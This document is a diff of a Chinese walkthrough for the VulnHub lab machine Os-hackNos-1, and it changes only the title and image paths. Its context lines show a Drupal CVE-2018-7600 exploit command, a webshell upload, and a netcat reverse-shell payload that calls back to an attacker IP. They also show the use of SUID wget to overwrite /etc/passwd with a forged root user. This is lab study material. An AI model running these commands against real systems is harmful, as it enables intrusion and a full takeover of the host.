@@ -1,4 +1,4 @@
-# vulnhub靶机 Os-hackNos-1
+# Os-hackNos-1
 
 靶机下载 https://www.vulnhub.com/entry/hacknos-os-hacknos,401
 
@@ -10,7 +10,7 @@
 
 使用vm打开这个ova文件进行导入。导入完成后，若是遇到无法获取ip地址，则需要在启动界面点击shift进入如下界面按下e
 
-![image-20230628231828025](vulnhub靶机 Os-hackNos-1.assets\image-20230628231828025.png)
+![image-20230628231828025](Os-hackNos-1.assets\image-20230628231828025.png)
 
 
 
@@ -18,7 +18,7 @@
 向下翻动，将ro改为rw single init=/bin/bash
 ```
 
-![image-20230628231856200](vulnhub靶机 Os-hackNos-1.assets\image-20230628231856200.png)
+![image-20230628231856200](Os-hackNos-1.assets\image-20230628231856200.png)
 
 然后按下 ctrl+x进入shell
 
@@ -26,7 +26,7 @@
 
 若发现无ip地址，则记住网卡名称，这里是ens33
 
-![image-20230628231909760](vulnhub靶机 Os-hackNos-1.assets\image-20230628231909760.png)
+![image-20230628231909760](Os-hackNos-1.assets\image-20230628231909760.png)
 
 使用
 
@@ -36,7 +36,7 @@ vim /etc/network/interfaces
 
 对网卡信息进行编辑
 
-![image-20230628231926804](vulnhub靶机 Os-hackNos-1.assets\image-20230628231926804.png)
+![image-20230628231926804](Os-hackNos-1.assets\image-20230628231926804.png)
 
 如果在使用vim /etc/network/interfaces没有如上信息，则需要重新导入ova，即删掉此虚拟机，重新使用vm打开ova并导入。
 
@@ -85,19 +85,19 @@ Network Distance: 1 hop
 
 故存在网页，则使用dirsearch进行目录扫描
 
-![image-20230628231946258](vulnhub靶机 Os-hackNos-1.assets\image-20230628231946258.png)
+![image-20230628231946258](Os-hackNos-1.assets\image-20230628231946258.png)
 
 发现http://192.168.5.132/drupal/并进行访问
 
-![image-20230628232004225](vulnhub靶机 Os-hackNos-1.assets\image-20230628232004225.png)
+![image-20230628232004225](Os-hackNos-1.assets\image-20230628232004225.png)
 
 通过 http://192.168.0.142/drupal/CHANGELOG.txt 得知grupal的版本为 Drupal 7.57
 
-![image-20230628232023925](vulnhub靶机 Os-hackNos-1.assets\image-20230628232023925.png)
+![image-20230628232023925](Os-hackNos-1.assets\image-20230628232023925.png)
 
 在百度等搜索引擎中搜索该版本的漏洞，找到CVE-2018-7600
 
-![image-20230628232037744](vulnhub靶机 Os-hackNos-1.assets\image-20230628232037744.png)
+![image-20230628232037744](Os-hackNos-1.assets\image-20230628232037744.png)
 
 在github中下载该漏洞的exp
 
@@ -118,7 +118,7 @@ python3 drupa7-CVE-2018-7600.py http://192.168.5.132/drupal/ -c ls
 
 即可执行ls读取文件
 
-![image-20230628232052599](vulnhub靶机 Os-hackNos-1.assets\image-20230628232052599.png)
+![image-20230628232052599](Os-hackNos-1.assets\image-20230628232052599.png)
 
 
 
@@ -144,9 +144,9 @@ php.php
 
 这里用哥斯拉进行连接
 
-![image-20230628232108952](vulnhub靶机 Os-hackNos-1.assets\image-20230628232108952.png)
+![image-20230628232108952](Os-hackNos-1.assets\image-20230628232108952.png)
 
-![image-20230628232130003](vulnhub靶机 Os-hackNos-1.assets\image-20230628232130003.png)
+![image-20230628232130003](Os-hackNos-1.assets\image-20230628232130003.png)
 
 
 
@@ -172,7 +172,7 @@ python -m SimpleHTTPServer
 
 查看php木马是否上传成功
 
-![image-20230628232146849](vulnhub靶机 Os-hackNos-1.assets\image-20230628232146849.png)
+![image-20230628232146849](Os-hackNos-1.assets\image-20230628232146849.png)
 
 
 
@@ -236,7 +236,7 @@ moon=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash++2>%261|nc+192.168.5.129+9
 
 提交之后可以反弹一个shell
 
-![image-20230628232204943](vulnhub靶机 Os-hackNos-1.assets\image-20230628232204943.png)
+![image-20230628232204943](Os-hackNos-1.assets\image-20230628232204943.png)
 
 此时已经反弹成功
 
@@ -246,7 +246,7 @@ moon=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash++2>%261|nc+192.168.5.129+9
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![image-20230628232226022](vulnhub靶机 Os-hackNos-1.assets\image-20230628232226022.png)
+![image-20230628232226022](Os-hackNos-1.assets\image-20230628232226022.png)
 
 在网站根目录发现一个**alexander.txt**
 
@@ -266,13 +266,13 @@ KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4g
 
 凭借经验看出这是base64加密的数据，将其使用base64解密
 
-![image-20230628232243956](vulnhub靶机 Os-hackNos-1.assets\image-20230628232243956.png)
+![image-20230628232243956](Os-hackNos-1.assets\image-20230628232243956.png)
 
 然后发现左边是Brainfuck
 
 
 
-![image-20230628232301143](vulnhub靶机 Os-hackNos-1.assets\image-20230628232301143.png)
+![image-20230628232301143](Os-hackNos-1.assets\image-20230628232301143.png)
 
 解密网站如下
 
@@ -280,7 +280,7 @@ KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4g
 https://www.splitbrain.org/services/ook
 ```
 
-![image-20230628232314924](vulnhub靶机 Os-hackNos-1.assets\image-20230628232314924.png)
+![image-20230628232314924](Os-hackNos-1.assets\image-20230628232314924.png)
 
 点击右下角Brainfuck to text即可解密
 
@@ -312,7 +312,7 @@ MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
 find / -perm -u=s -type f 2>/dev/null
 ```
 
-![image-20230628232332862](vulnhub靶机 Os-hackNos-1.assets\image-20230628232332862.png)
+![image-20230628232332862](Os-hackNos-1.assets\image-20230628232332862.png)
 
 发现wget普通用户也可执行
 
@@ -363,11 +363,11 @@ moon:$1$moon$8F2YI9c3zhkkS9SOsKawY0:0:0:root:/root:/bin/bash
 
 在kali中生成密码
 
-![image-20230628232349133](vulnhub靶机 Os-hackNos-1.assets\image-20230628232349133.png)
+![image-20230628232349133](Os-hackNos-1.assets\image-20230628232349133.png)
 
 将moon加入到伪造的passwd，并赋予root权限
 
-![image-20230628232408828](vulnhub靶机 Os-hackNos-1.assets\image-20230628232408828.png)
+![image-20230628232408828](Os-hackNos-1.assets\image-20230628232408828.png)
 
 将passwd放到开启了python  httpserver的文件夹中
 
@@ -385,7 +385,7 @@ wget http://192.168.5.129:8000/passwd -O /etc/passwd
 
 然后在已有的shell中进行切换用户
 
-![image-20230628232454442](vulnhub靶机 Os-hackNos-1.assets\image-20230628232454442.png)
+![image-20230628232454442](Os-hackNos-1.assets\image-20230628232454442.png)
 
 
 
@@ -427,5 +427,5 @@ Blog : www.hackNos.com
 
 su: must be run from a terminal
 
-![image-20230628232523339](vulnhub靶机 Os-hackNos-1.assets\image-20230628232523339.png)
+![image-20230628232523339](Os-hackNos-1.assets\image-20230628232523339.png)
 
